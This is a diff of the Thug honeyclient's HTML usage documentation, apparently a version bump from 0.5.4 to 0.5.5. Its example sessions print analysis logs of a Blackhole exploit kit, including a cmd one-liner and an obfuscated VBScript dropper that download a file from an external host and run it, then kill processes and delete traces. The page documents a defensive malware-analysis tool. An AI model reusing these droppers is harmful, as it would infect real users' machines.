@@ -1,5 +1,3 @@
-
-
 <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
   "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
 
@@ -8,15 +6,15 @@
   <head>
     <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
     
-    <title>Usage &mdash; Thug 0.5.4 documentation</title>
+    <title>Usage &mdash; Thug 0.5.5 documentation</title>
     
     <link rel="stylesheet" href="static/default.css" type="text/css" />
     <link rel="stylesheet" href="static/pygments.css" type="text/css" />
     
     <script type="text/javascript">
       var DOCUMENTATION_OPTIONS = {
-        URL_ROOT:    '',
-        VERSION:     '0.5.4',
+        URL_ROOT:    './',
+        VERSION:     '0.5.5',
         COLLAPSE_INDEX: false,
         FILE_SUFFIX: '.html',
         HAS_SOURCE:  true
@@ -25,7 +23,7 @@
     <script type="text/javascript" src="static/jquery.js"></script>
     <script type="text/javascript" src="static/underscore.js"></script>
     <script type="text/javascript" src="static/doctools.js"></script>
-    <link rel="top" title="Thug 0.5.4 documentation" href="index.html" />
+    <link rel="top" title="Thug 0.5.5 documentation" href="index.html" />
     <link rel="next" title="Thug API" href="api.html" />
     <link rel="prev" title="Configuration" href="configuration.html" /> 
   </head>
@@ -42,7 +40,7 @@
         <li class="right" >
           <a href="configuration.html" title="Configuration"
              accesskey="P">previous</a> |</li>
-        <li><a href="index.html">Thug 0.5.4 documentation</a> &raquo;</li> 
+        <li><a href="index.html">Thug 0.5.5 documentation</a> &raquo;</li> 
       </ul>
     </div>  
 
@@ -71,13 +69,13 @@ Synopsis:
     Options:
         -h, --help              Display this <span class="nb">help </span>information
         -V, --version           Display Thug version
-        -u, --useragent<span class="o">=</span>        Select a user agent <span class="o">(</span>see below <span class="k">for </span>values, default: winxpie60<span class="o">)</span>
+        -u, --useragent<span class="o">=</span>        Select a user agent <span class="o">(</span>see below <span class="k">for</span> values, default: winxpie60<span class="o">)</span>
         -e, --events<span class="o">=</span>           Enable comma-separated specified DOM events handling
         -w, --delay<span class="o">=</span>            Set a maximum setTimeout/setInterval delay value <span class="o">(</span>in milliseconds<span class="o">)</span>
         -n, --logdir<span class="o">=</span>           Set the log output directory
         -o, --output<span class="o">=</span>           Log to a specified file
         -r, --referer<span class="o">=</span>          Specify a referer
-        -p, --proxy<span class="o">=</span>            Specify a proxy <span class="o">(</span>see below <span class="k">for </span>format and supported schemes<span class="o">)</span>
+        -p, --proxy<span class="o">=</span>            Specify a proxy <span class="o">(</span>see below <span class="k">for</span> format and supported schemes<span class="o">)</span>
         -l, --local             Analyze a locally saved page
         -x, --local-nofetch     Analyze a locally saved page and prevent remote content fetching
         -v, --verbose           Enable verbose mode
@@ -133,15 +131,86 @@ Synopsis:
         galaxy2chrome29         Chrome 29.0.1547.59     <span class="o">(</span>Samsung Galaxy S II, Android 4.1.2<span class="o">)</span>
         nexuschrome18           Chrome 18.0.1025.133    <span class="o">(</span>Google Nexus, Android 4.0.4<span class="o">)</span>
         ipadsafari7             Safari 7.0              <span class="o">(</span>iPad, iOS 7.0.4<span class="o">)</span>
+        ipadsafari8             Safari 8.0              <span class="o">(</span>iPad, iOS 8.0.2<span class="o">)</span>
         ipadchrome33            Chrome 33.0.1750.21     <span class="o">(</span>iPad, iOS 7.1<span class="o">)</span>
         ipadchrome35            Chrome 35.0.1916.41     <span class="o">(</span>iPad, iOS 7.1.1<span class="o">)</span>
         ipadchrome37            Chrome 37.0.2062.52     <span class="o">(</span>iPad, iOS 7.1.2<span class="o">)</span>
+        ipadchrome38            Chrome 38.0.2125.59     <span class="o">(</span>iPad, iOS 8.0.2<span class="o">)</span>
 </pre></div>
 </div>
 <p>Let&#8217;s start with a first basic real-world example: a Blackhole exploit kit.</p>
-<div class="highlight-sh"><pre>       ~/thug/src $ python thug.py "http://[omitted]/main.php?page=8c6c59becaa0da07"
+<div class="highlight-sh"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
+ 2
+ 3
+ 4
+ 5
+ 6
+ 7
+ 8
+ 9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+57
+58
+59
+60
+61
+62
+63
+64
+65
+66
+67
+68
+69
+70</pre></div></td><td class="code"><div class="highlight"><pre>       ~/thug/src $ python thug.py &quot;http://[omitted]/main.php?page=8c6c59becaa0da07&quot;
        [2012-07-02 19:15:20] [HTTP] URL: http://[omitted]/main.php?page=8c6c59becaa0da07 (Status: 200, Referrer: None)
-       [2012-07-02 19:15:20] &lt;applet archive="Ryp.jar" code="sIda.sIda"&gt;&lt;param name="b" value="56:14:14:19:27:50:50:6:56:47:66:47:33:19:22:48:11:33:49:66:11:14:50:48:49:19:56:19:46:67:24:0:12:1:60:61:70:11:24:12"&gt;&lt;/param&gt;&lt;/applet&gt;
+       [2012-07-02 19:15:20] &lt;applet archive=&quot;Ryp.jar&quot; code=&quot;sIda.sIda&quot;&gt;&lt;param name=&quot;b&quot; value=&quot;56:14:14:19:27:50:50:6:56:47:66:47:33:19:22:48:11:33:49:66:11:14:50:48:49:19:56:19:46:67:24:0:12:1:60:61:70:11:24:12&quot;&gt;&lt;/param&gt;&lt;/applet&gt;
        [2012-07-02 19:15:20] [Navigator URL Translation] Ryp.jar --&gt;  http://[omitted]/Ryp.jar
        [2012-07-02 19:15:22] [HTTP] URL: http://[omitted]/Ryp.jar (Status: 200, Referrer: http://[omitted]/main.php?page=8c6c59becaa0da07)
        [2012-07-02 19:15:23] Saving applet Ryp.jar
@@ -174,42 +243,43 @@ Synopsis:
        [2012-07-02 19:15:36] Microsoft Windows Help Center Malformed Escape Sequences Incorrect Handling
        [2012-07-02 19:15:36] [AST]: Eval argument length &gt; 64
        [2012-07-02 19:15:36] [Windows Script Host Run] Command:
-       cmd /c echo B="l.vbs":With CreateObject("MSXML2.XMLHTTP"):.open "GET","http://[omitted]/data/hcp_vbs.php?f=b081d&amp;d=0",false:.send():Set A = CreateObject("Scripting.FileSystemObject"):Set D=A.CreateTextFile(A.GetSpecialFolder(2) + "\" + B):D.WriteLine .responseText:End With:D.Close:CreateObject("WScript.Shell").Run A.GetSpecialFolder(2) + "\" + B &gt; %TEMP%\\l.vbs &amp;&amp; %TEMP%\\l.vbs &amp;&amp; taskkill /F /IM helpctr.exe
+       cmd /c echo B=&quot;l.vbs&quot;:With CreateObject(&quot;MSXML2.XMLHTTP&quot;):.open &quot;GET&quot;,&quot;http://[omitted]/data/hcp_vbs.php?f=b081d&amp;d=0&quot;,false:.send():Set A = CreateObject(&quot;Scripting.FileSystemObject&quot;):Set D=A.CreateTextFile(A.GetSpecialFolder(2) + &quot;\&quot; + B):D.WriteLine .responseText:End With:D.Close:CreateObject(&quot;WScript.Shell&quot;).Run A.GetSpecialFolder(2) + &quot;\&quot; + B &gt; %TEMP%\\l.vbs &amp;&amp; %TEMP%\\l.vbs &amp;&amp; taskkill /F /IM helpctr.exe
 
        [2012-07-02 19:15:36] [Windows Script Host Run - Stage 1] Code:
-       cmd /c echo B="l.vbs":With CreateObject("MSXML2.XMLHTTP"):.open "GET","http://[omitted]/data/hcp_vbs.php?f=b081d&amp;d=0",false:.send():Set A = CreateObject("Scripting.FileSystemObject"):Set D=A.CreateTextFile(A.GetSpecialFolder(2) + "\" + B):D.WriteLine .responseText:End With:D.Close:CreateObject("WScript.Shell").Run A.GetSpecialFolder(2) + "\" + B &gt; %TEMP%\\l.vbs &amp;&amp; %TEMP%\\l.vbs &amp;&amp; taskkill /F /IM helpctr.exe
+       cmd /c echo B=&quot;l.vbs&quot;:With CreateObject(&quot;MSXML2.XMLHTTP&quot;):.open &quot;GET&quot;,&quot;http://[omitted]/data/hcp_vbs.php?f=b081d&amp;d=0&quot;,false:.send():Set A = CreateObject(&quot;Scripting.FileSystemObject&quot;):Set D=A.CreateTextFile(A.GetSpecialFolder(2) + &quot;\&quot; + B):D.WriteLine .responseText:End With:D.Close:CreateObject(&quot;WScript.Shell&quot;).Run A.GetSpecialFolder(2) + &quot;\&quot; + B &gt; %TEMP%\\l.vbs &amp;&amp; %TEMP%\\l.vbs &amp;&amp; taskkill /F /IM helpctr.exe
        [2012-07-02 19:15:36] [Windows Script Host Run - Stage 1] Downloading from URL http://[omitted]/data/hcp_vbs.php?f=b081d&amp;d=0
        [2012-07-02 19:15:37] [HTTP] URL: http://[omitted]/data/hcp_vbs.php?f=b081d&amp;d=0 (Status: 200, Referrer: http://[omitted]/main.php?page=8c6c59becaa0da07)
        [2012-07-02 19:15:37] [Windows Script Host Run - Stage 1] Saving file d26b9b1a1f667004945d1d000cf4f19e
        [2012-07-02 19:15:37] [Windows Script Host Run - Stage 2] Code:
-       w=3000:x=200:y=1:z=false:a = "http://[omitted]/w.php?e=5&amp;f=b081d":Set e = Createobject(StrReverse("tcejbOmetsySeliF.gnitpircS")):Set f=e.GetSpecialFolder(2):b = f &amp; "\exe.ex2":b=Replace(b,Month("2010-02-16"),"e"):OT = "GET":Set c = CreateObject(StrReverse("PTTHLMX.2LMXSM")):Set d = CreateObject(StrReverse("ertS.BDODA") &amp; "am")
-       Set o=Createobject(StrReverse("tcejbOmetsySeliF.gnitpircS"))
+       w=3000:x=200:y=1:z=false:a = &quot;http://[omitted]/w.php?e=5&amp;f=b081d&quot;:Set e = Createobject(StrReverse(&quot;tcejbOmetsySeliF.gnitpircS&quot;)):Set f=e.GetSpecialFolder(2):b = f &amp; &quot;\exe.ex2&quot;:b=Replace(b,Month(&quot;2010-02-16&quot;),&quot;e&quot;):OT = &quot;GET&quot;:Set c = CreateObject(StrReverse(&quot;PTTHLMX.2LMXSM&quot;)):Set d = CreateObject(StrReverse(&quot;ertS.BDODA&quot;) &amp; &quot;am&quot;)
+       Set o=Createobject(StrReverse(&quot;tcejbOmetsySeliF.gnitpircS&quot;))
        On Error resume next
        c.open OT, a, z:c.send()
        If c.Status = x Then
        d.Open:d.Type = y:d.Write c.ResponseBody:d.SaveToFile b:d.Close
        End If
-       Set w=CreateObject(StrReverse("llehS." &amp; "tpi"&amp;"rcSW"))
-       Eval(Replace("W.ex2c b", Month("2010-02-16"), "E"))
-       W.eXeC "taskkill /F /IM wm" &amp; "player.e" &amp; "xe":W.eXeC "taskkill /F /IM realplay.ex" &amp; "e":Set g=o.GetFile(e.GetSpecialFolder(3-1) &amp; "\" &amp; StrReverse("bv.l") &amp; "s"):g.Delete:WScript.Sleep w:Set g=o.GetFile(b):Eval("g.Delete")
+       Set w=CreateObject(StrReverse(&quot;llehS.&quot; &amp; &quot;tpi&quot;&amp;&quot;rcSW&quot;))
+       Eval(Replace(&quot;W.ex2c b&quot;, Month(&quot;2010-02-16&quot;), &quot;E&quot;))
+       W.eXeC &quot;taskkill /F /IM wm&quot; &amp; &quot;player.e&quot; &amp; &quot;xe&quot;:W.eXeC &quot;taskkill /F /IM realplay.ex&quot; &amp; &quot;e&quot;:Set g=o.GetFile(e.GetSpecialFolder(3-1) &amp; &quot;\&quot; &amp; StrReverse(&quot;bv.l&quot;) &amp; &quot;s&quot;):g.Delete:WScript.Sleep w:Set g=o.GetFile(b):Eval(&quot;g.Delete&quot;)
 
        [2012-07-02 19:15:37] [Windows Script Host Run - Stage 2] Downloading from URL http://[omitted]/w.php?e=5&amp;f=b081d
        [2012-07-02 19:15:43] [HTTP] URL: http://[omitted]/w.php?e=5&amp;f=b081d (Status: 200, Referrer: http://[omitted]/main.php?page=8c6c59becaa0da07)
        [2012-07-02 19:15:45] [Windows Script Host Run - Stage 2] Saving file d328b5a123bce1c0d20d763ad745303a
-       [2012-07-02 19:15:45] &lt;object classid="clsid:d27cdb6e-ae6d-11cf-96b8-444553540000" height="10" id="swf_id" width="10"&gt;&lt;param name="movie" value="data/field.swf"&gt;&lt;/param&gt;&lt;param name="allowScriptAccess" value="always"&gt;&lt;/param&gt;&lt;param name="Play" value="0"&gt;&lt;/param&gt;&lt;embed allowscriptaccess="always" height="10" id="swf_id" name="swf_id" src="data/field.swf" type="application/x-shockwave-flash" width="10"&gt;&lt;/embed&gt;&lt;/object&gt;
-       [2012-07-02 19:15:45] &lt;param name="b" value="56:14:14:19:27:50:50:6:56:47:66:47:33:19:22:48:11:33:49:66:11:14:50:48:49:19:56:19:46:67:24:0:12:1:60:61:70:11:24:12"&gt;&lt;/param&gt;
-       [2012-07-02 19:15:45] &lt;param name="movie" value="data/field.swf"&gt;&lt;/param&gt;
+       [2012-07-02 19:15:45] &lt;object classid=&quot;clsid:d27cdb6e-ae6d-11cf-96b8-444553540000&quot; height=&quot;10&quot; id=&quot;swf_id&quot; width=&quot;10&quot;&gt;&lt;param name=&quot;movie&quot; value=&quot;data/field.swf&quot;&gt;&lt;/param&gt;&lt;param name=&quot;allowScriptAccess&quot; value=&quot;always&quot;&gt;&lt;/param&gt;&lt;param name=&quot;Play&quot; value=&quot;0&quot;&gt;&lt;/param&gt;&lt;embed allowscriptaccess=&quot;always&quot; height=&quot;10&quot; id=&quot;swf_id&quot; name=&quot;swf_id&quot; src=&quot;data/field.swf&quot; type=&quot;application/x-shockwave-flash&quot; width=&quot;10&quot;&gt;&lt;/embed&gt;&lt;/object&gt;
+       [2012-07-02 19:15:45] &lt;param name=&quot;b&quot; value=&quot;56:14:14:19:27:50:50:6:56:47:66:47:33:19:22:48:11:33:49:66:11:14:50:48:49:19:56:19:46:67:24:0:12:1:60:61:70:11:24:12&quot;&gt;&lt;/param&gt;
+       [2012-07-02 19:15:45] &lt;param name=&quot;movie&quot; value=&quot;data/field.swf&quot;&gt;&lt;/param&gt;
        [2012-07-02 19:15:45] [Navigator URL Translation] data/field.swf --&gt;  http://[omitted]/data/field.swf
        [2012-07-02 19:15:52] [HTTP] URL: http://[omitted]/data/field.swf (Status: 200, Referrer: http://[omitted]/main.php?page=8c6c59becaa0da07)
        [2012-07-02 19:15:52] Saving remote content at data/field.swf (MD5: 502da89357ca5d7c85dc7a67f8977b21)
-       [2012-07-02 19:15:52] &lt;param name="allowScriptAccess" value="always"&gt;&lt;/param&gt;
-       [2012-07-02 19:15:52] &lt;param name="Play" value="0"&gt;&lt;/param&gt;
-       [2012-07-02 19:15:52] &lt;embed allowscriptaccess="always" height="10" id="swf_id" name="swf_id" src="data/field.swf" type="application/x-shockwave-flash" width="10"&gt;&lt;/embed&gt;
+       [2012-07-02 19:15:52] &lt;param name=&quot;allowScriptAccess&quot; value=&quot;always&quot;&gt;&lt;/param&gt;
+       [2012-07-02 19:15:52] &lt;param name=&quot;Play&quot; value=&quot;0&quot;&gt;&lt;/param&gt;
+       [2012-07-02 19:15:52] &lt;embed allowscriptaccess=&quot;always&quot; height=&quot;10&quot; id=&quot;swf_id&quot; name=&quot;swf_id&quot; src=&quot;data/field.swf&quot; type=&quot;application/x-shockwave-flash&quot; width=&quot;10&quot;&gt;&lt;/embed&gt;
        [2012-07-02 19:15:52] [Navigator URL Translation] data/field.swf --&gt;  http://[omitted]/data/field.swf
        [2012-07-02 19:15:53] [HTTP] URL: http://[omitted]/data/field.swf (Status: 200, Referrer: http://[omitted]/main.php?page=8c6c59becaa0da07)
        [2012-07-02 19:15:53] Saving remote content at data/field.swf (MD5: 502da89357ca5d7c85dc7a67f8977b21)
-       [2012-07-02 19:15:53] Saving log analysis at ../logs/baa880d8d79c3488f2c0557be24cca6b/20120702191511</pre>
-</div>
+       [2012-07-02 19:15:53] Saving log analysis at ../logs/baa880d8d79c3488f2c0557be24cca6b/20120702191511
+</pre></div>
+</td></tr></table></div>
 <p>Let&#8217;s take a look at the directory which contains the logs for this session</p>
 <div class="highlight-sh"><div class="highlight"><pre>~/thug/src <span class="nv">$ </span><span class="nb">cd</span> ../logs/baa880d8d79c3488f2c0557be24cca6b/20120702191511
 ~/thug/logs/baa880d8d79c3488f2c0557be24cca6b/20120702191511 <span class="nv">$ </span>ls -lhR
@@ -261,28 +331,29 @@ the URL analysis are saved in this directory based on their Content-Type for con
 <p>Moreover if MongoDB is installed the information you can see in this directory are saved in the
 database instance too. Let&#8217;s take a deeper look using pymongo (you can get the same result by
 using the MongoDB client <em>mongo</em>).</p>
-<div class="highlight-sh"><pre>~/thug/src $ python
+<div class="highlight-sh"><div class="highlight"><pre>~/thug/src $ python
 Python 2.7.3 (default, Jun 12 2012, 10:22:50)
 [GCC 4.5.3] on linux2
-Type "help", "copyright", "credits" or "license" for more information.
+Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.
 &gt;&gt;&gt; import pymongo
 &gt;&gt;&gt; connection = pymongo.Connection()
 &gt;&gt;&gt; db = connection.thug
-&gt;&gt;&gt; url = db.urls.find_one({'url' : 'http://[omitted]/main.php?page=8c6c59becaa0da07'})
+&gt;&gt;&gt; url = db.urls.find_one({&#39;url&#39; : &#39;http://[omitted]/main.php?page=8c6c59becaa0da07&#39;})
 &gt;&gt;&gt; url
-{u'url': u'http://[omitted]/main.php?page=8c6c59becaa0da07', u'_id': ObjectId('4ff1b8efe732795951000000')}
-&gt;&gt;&gt; for sample in db.samples.find({'url_id': url['_id']}):
+{u&#39;url&#39;: u&#39;http://[omitted]/main.php?page=8c6c59becaa0da07&#39;, u&#39;_id&#39;: ObjectId(&#39;4ff1b8efe732795951000000&#39;)}
+&gt;&gt;&gt; for sample in db.samples.find({&#39;url_id&#39;: url[&#39;_id&#39;]}):
 ...     print sample
 ...
 
-{u'_id': ObjectId('4ff1b8f4e732795951000001'), u'url': u'http://[omitted]/Ryp.jar', u'type': u'JAR', u'sha1': u'5fffd5cc4a372a6c2a826a850a955cb6a4042272', u'url_id': ObjectId('4ff1b8efe732795951000000'), u'data': u'[skipped]', u'md5': u'e3639fde6ddf7fd0182fff9757143ff2'}
-{u'_id': ObjectId('4ff1b8f7e732795951000002'), u'url': u'http://[omitted]/w.php?f=b081d&amp;e=2', u'type': u'PE', u'sha1': u'1445e7d338d0d7c20f1d2329f4d653cce1562cc8', u'url_id': ObjectId('4ff1b8efe732795951000000'), u'data':  u'[skipped]', u'md5': u'd328b5a123bce1c0d20d763ad745303a'}
+{u&#39;_id&#39;: ObjectId(&#39;4ff1b8f4e732795951000001&#39;), u&#39;url&#39;: u&#39;http://[omitted]/Ryp.jar&#39;, u&#39;type&#39;: u&#39;JAR&#39;, u&#39;sha1&#39;: u&#39;5fffd5cc4a372a6c2a826a850a955cb6a4042272&#39;, u&#39;url_id&#39;: ObjectId(&#39;4ff1b8efe732795951000000&#39;), u&#39;data&#39;: u&#39;[skipped]&#39;, u&#39;md5&#39;: u&#39;e3639fde6ddf7fd0182fff9757143ff2&#39;}
+{u&#39;_id&#39;: ObjectId(&#39;4ff1b8f7e732795951000002&#39;), u&#39;url&#39;: u&#39;http://[omitted]/w.php?f=b081d&amp;e=2&#39;, u&#39;type&#39;: u&#39;PE&#39;, u&#39;sha1&#39;: u&#39;1445e7d338d0d7c20f1d2329f4d653cce1562cc8&#39;, u&#39;url_id&#39;: ObjectId(&#39;4ff1b8efe732795951000000&#39;), u&#39;data&#39;:  u&#39;[skipped]&#39;, u&#39;md5&#39;: u&#39;d328b5a123bce1c0d20d763ad745303a&#39;}
 [..]
-&gt;&gt;&gt; for event in db.events.find({'url_id': url['_id']}):
+&gt;&gt;&gt; for event in db.events.find({&#39;url_id&#39;: url[&#39;_id&#39;]}):
 ...     print event
 ...
-{u'MAEC': u'&lt;MAEC_Bundle xmlns:ns1="http://xml/metadataSharing.xsd" xmlns="http://maec.mitre.org/XMLSchema/maec-core-1" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://maec.mitre.org/XMLSchema/maec-core-1 file:MAEC_v1.1.xsd" id="maec:thug:bnd:1" schema_version="1.100000"&gt;
-[..]</pre>
+{u&#39;MAEC&#39;: u&#39;&lt;MAEC_Bundle xmlns:ns1=&quot;http://xml/metadataSharing.xsd&quot; xmlns=&quot;http://maec.mitre.org/XMLSchema/maec-core-1&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xsi:schemaLocation=&quot;http://maec.mitre.org/XMLSchema/maec-core-1 file:MAEC_v1.1.xsd&quot; id=&quot;maec:thug:bnd:1&quot; schema_version=&quot;1.100000&quot;&gt;
+[..]
+</pre></div>
 </div>
 </div>
 <div class="section" id="browser-personality">
@@ -297,9 +368,9 @@ executable for later analysis.</p>
 personality the <em>-u (&#8211;useragent)</em> option should be used. In the following example, the
 option <em>-u winxpie80</em> is used in order to test the content served when surfing the same
 page with Internet Explorer 8.0 on Windows XP platform.</p>
-<div class="highlight-sh"><pre>~/thug/src $ python thug.py -u winxpie80 "http://[omitted]/main.php?page=8c6c59becaa0da07"
+<div class="highlight-sh"><div class="highlight"><pre>~/thug/src $ python thug.py -u winxpie80 &quot;http://[omitted]/main.php?page=8c6c59becaa0da07&quot;
 [2012-07-02 19:21:00] [HTTP] URL: http://[omitted]/main.php?page=8c6c59becaa0da07 (Status: 200, Referrer: None)
-[2012-07-02 19:21:00] &lt;applet archive="Ryp.jar" code="sIda.sIda"&gt;&lt;param name="b" value="56:14:14:19:27:50:50:6:56:47:66:47:33:19:22:48:11:33:49:66:11:14:50:48:49:19:56:19:46:67:24:0:12:1:60:61:70:11:24:12"&gt;&lt;/param&gt;&lt;/applet&gt;
+[2012-07-02 19:21:00] &lt;applet archive=&quot;Ryp.jar&quot; code=&quot;sIda.sIda&quot;&gt;&lt;param name=&quot;b&quot; value=&quot;56:14:14:19:27:50:50:6:56:47:66:47:33:19:22:48:11:33:49:66:11:14:50:48:49:19:56:19:46:67:24:0:12:1:60:61:70:11:24:12&quot;&gt;&lt;/param&gt;&lt;/applet&gt;
 [2012-07-02 19:21:00] [Navigator URL Translation] Ryp.jar --&gt;  http://[omitted]/Ryp.jar
 [2012-07-02 19:21:02] [HTTP] URL: http://[omitted]/Ryp.jar (Status: 200, Referrer: http://[omitted]/main.php?page=8c6c59becaa0da07)
 [2012-07-02 19:21:03] Saving applet Ryp.jar
@@ -317,43 +388,44 @@ page with Internet Explorer 8.0 on Windows XP platform.</p>
 [2012-07-02 19:21:05] Microsoft Windows Help Center Malformed Escape Sequences Incorrect Handling
 [2012-07-02 19:21:05] [AST]: Eval argument length &gt; 64
 [2012-07-02 19:21:05] [Windows Script Host Run] Command:
-cmd /c echo B="l.vbs":With CreateObject("MSXML2.XMLHTTP"):.open "GET","http://[omitted]/data/hcp_vbs.php?f=b081d&amp;d=0",false:.send():Set A = CreateObject("Scripting.FileSystemObject"):Set D=A.CreateTextFile(A.GetSpecialFolder(2) + "\" + B):D.WriteLine .responseText:End With:D.Close:CreateObject("WScript.Shell").Run A.GetSpecialFolder(2) + "\" + B &gt; %TEMP%\\l.vbs &amp;&amp; %TEMP%\\l.vbs &amp;&amp; taskkill /F /IM helpctr.exe
+cmd /c echo B=&quot;l.vbs&quot;:With CreateObject(&quot;MSXML2.XMLHTTP&quot;):.open &quot;GET&quot;,&quot;http://[omitted]/data/hcp_vbs.php?f=b081d&amp;d=0&quot;,false:.send():Set A = CreateObject(&quot;Scripting.FileSystemObject&quot;):Set D=A.CreateTextFile(A.GetSpecialFolder(2) + &quot;\&quot; + B):D.WriteLine .responseText:End With:D.Close:CreateObject(&quot;WScript.Shell&quot;).Run A.GetSpecialFolder(2) + &quot;\&quot; + B &gt; %TEMP%\\l.vbs &amp;&amp; %TEMP%\\l.vbs &amp;&amp; taskkill /F /IM helpctr.exe
 
 [2012-07-02 19:21:05] [Windows Script Host Run - Stage 1] Code:
-cmd /c echo B="l.vbs":With CreateObject("MSXML2.XMLHTTP"):.open "GET","http://[omitted]/data/hcp_vbs.php?f=b081d&amp;d=0",false:.send():Set A = CreateObject("Scripting.FileSystemObject"):Set D=A.CreateTextFile(A.GetSpecialFolder(2) + "\" + B):D.WriteLine .responseText:End With:D.Close:CreateObject("WScript.Shell").Run A.GetSpecialFolder(2) + "\" + B &gt; %TEMP%\\l.vbs &amp;&amp; %TEMP%\\l.vbs &amp;&amp; taskkill /F /IM helpctr.exe
+cmd /c echo B=&quot;l.vbs&quot;:With CreateObject(&quot;MSXML2.XMLHTTP&quot;):.open &quot;GET&quot;,&quot;http://[omitted]/data/hcp_vbs.php?f=b081d&amp;d=0&quot;,false:.send():Set A = CreateObject(&quot;Scripting.FileSystemObject&quot;):Set D=A.CreateTextFile(A.GetSpecialFolder(2) + &quot;\&quot; + B):D.WriteLine .responseText:End With:D.Close:CreateObject(&quot;WScript.Shell&quot;).Run A.GetSpecialFolder(2) + &quot;\&quot; + B &gt; %TEMP%\\l.vbs &amp;&amp; %TEMP%\\l.vbs &amp;&amp; taskkill /F /IM helpctr.exe
 [2012-07-02 19:21:05] [Windows Script Host Run - Stage 1] Downloading from URL http://[omitted]/data/hcp_vbs.php?f=b081d&amp;d=0
 [2012-07-02 19:21:06] [HTTP] URL: http://[omitted]/data/hcp_vbs.php?f=b081d&amp;d=0 (Status: 200, Referrer: http://[omitted]/main.php?page=8c6c59becaa0da07)
 [2012-07-02 19:21:06] [Windows Script Host Run - Stage 1] Saving file d26b9b1a1f667004945d1d000cf4f19e
 [2012-07-02 19:21:06] [Windows Script Host Run - Stage 2] Code:
-w=3000:x=200:y=1:z=false:a = "http://[omitted]/w.php?e=5&amp;f=b081d":Set e = Createobject(StrReverse("tcejbOmetsySeliF.gnitpircS")):Set f=e.GetSpecialFolder(2):b = f &amp; "\exe.ex2":b=Replace(b,Month("2010-02-16"),"e"):OT = "GET":Set c = CreateObject(StrReverse("PTTHLMX.2LMXSM")):Set d = CreateObject(StrReverse("ertS.BDODA") &amp; "am")
-Set o=Createobject(StrReverse("tcejbOmetsySeliF.gnitpircS"))
+w=3000:x=200:y=1:z=false:a = &quot;http://[omitted]/w.php?e=5&amp;f=b081d&quot;:Set e = Createobject(StrReverse(&quot;tcejbOmetsySeliF.gnitpircS&quot;)):Set f=e.GetSpecialFolder(2):b = f &amp; &quot;\exe.ex2&quot;:b=Replace(b,Month(&quot;2010-02-16&quot;),&quot;e&quot;):OT = &quot;GET&quot;:Set c = CreateObject(StrReverse(&quot;PTTHLMX.2LMXSM&quot;)):Set d = CreateObject(StrReverse(&quot;ertS.BDODA&quot;) &amp; &quot;am&quot;)
+Set o=Createobject(StrReverse(&quot;tcejbOmetsySeliF.gnitpircS&quot;))
 On Error resume next
 c.open OT, a, z:c.send()
 If c.Status = x Then
 d.Open:d.Type = y:d.Write c.ResponseBody:d.SaveToFile b:d.Close
 End If
-Set w=CreateObject(StrReverse("llehS." &amp; "tpi"&amp;"rcSW"))
-Eval(Replace("W.ex2c b", Month("2010-02-16"), "E"))
-W.eXeC "taskkill /F /IM wm" &amp; "player.e" &amp; "xe":W.eXeC "taskkill /F /IM realplay.ex" &amp; "e":Set g=o.GetFile(e.GetSpecialFolder(3-1) &amp; "\" &amp; StrReverse("bv.l") &amp; "s"):g.Delete:WScript.Sleep w:Set g=o.GetFile(b):Eval("g.Delete")
+Set w=CreateObject(StrReverse(&quot;llehS.&quot; &amp; &quot;tpi&quot;&amp;&quot;rcSW&quot;))
+Eval(Replace(&quot;W.ex2c b&quot;, Month(&quot;2010-02-16&quot;), &quot;E&quot;))
+W.eXeC &quot;taskkill /F /IM wm&quot; &amp; &quot;player.e&quot; &amp; &quot;xe&quot;:W.eXeC &quot;taskkill /F /IM realplay.ex&quot; &amp; &quot;e&quot;:Set g=o.GetFile(e.GetSpecialFolder(3-1) &amp; &quot;\&quot; &amp; StrReverse(&quot;bv.l&quot;) &amp; &quot;s&quot;):g.Delete:WScript.Sleep w:Set g=o.GetFile(b):Eval(&quot;g.Delete&quot;)
 
 [2012-07-02 19:21:06] [Windows Script Host Run - Stage 2] Downloading from URL http://[omitted]/w.php?e=5&amp;f=b081d
 [2012-07-02 19:21:09] [HTTP] URL: http://[omitted]/w.php?e=5&amp;f=b081d (Status: 200, Referrer: http://[omitted]/main.php?page=8c6c59becaa0da07)
 [2012-07-02 19:21:11] [Windows Script Host Run - Stage 2] Saving file d328b5a123bce1c0d20d763ad745303a
-[2012-07-02 19:21:11] &lt;object classid="clsid:d27cdb6e-ae6d-11cf-96b8-444553540000" height="10" id="swf_id" width="10"&gt;&lt;param name="movie" value="data/field.swf"&gt;&lt;/param&gt;&lt;param name="allowScriptAccess" value="always"&gt;&lt;/param&gt;&lt;param name="Play" value="0"&gt;&lt;/param&gt;&lt;embed allowscriptaccess="always" height="10" id="swf_id" name="swf_id" src="data/field.swf" type="application/x-shockwave-flash" width="10"&gt;&lt;/embed&gt;&lt;/object&gt;
-[2012-07-02 19:21:11] &lt;param name="b" value="56:14:14:19:27:50:50:6:56:47:66:47:33:19:22:48:11:33:49:66:11:14:50:48:49:19:56:19:46:67:24:0:12:1:60:61:70:11:24:12"&gt;&lt;/param&gt;
